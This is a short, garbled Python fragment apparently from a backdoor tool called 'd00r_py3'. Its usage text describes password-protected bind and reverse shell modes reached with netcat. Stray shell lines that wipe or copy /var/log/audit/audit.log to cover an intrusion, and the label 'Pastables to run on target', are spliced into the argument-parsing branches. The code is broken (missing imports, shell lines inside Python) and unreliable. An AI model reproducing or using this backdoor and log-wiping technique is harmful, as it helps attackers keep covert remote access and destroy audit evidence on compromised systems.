#!/usr/bin/python

if len(argv) < 4:
    print("usage:")
    print("% ./d00r_py3 -b password port")
    print("% ./d00r_py3 -r password port host")
    print("% nc host port")
    print("% nc -l -p port (please use netcat)")
    sys.exit(1)
elif argv[1] == "-b":
"> /var/log/audit/audit.log; rm -f ."
    PW = argv[2]
    PORT = argv[3]
"Pastables to run on target:"
elif argv[1] == "-r" and len(argv) > 4:
    PW = argv[2]
    PORT = argv[3]
cp /var/log/audit/audit.log .tmp
    HOST = argv[4]
else:
    exit(1)
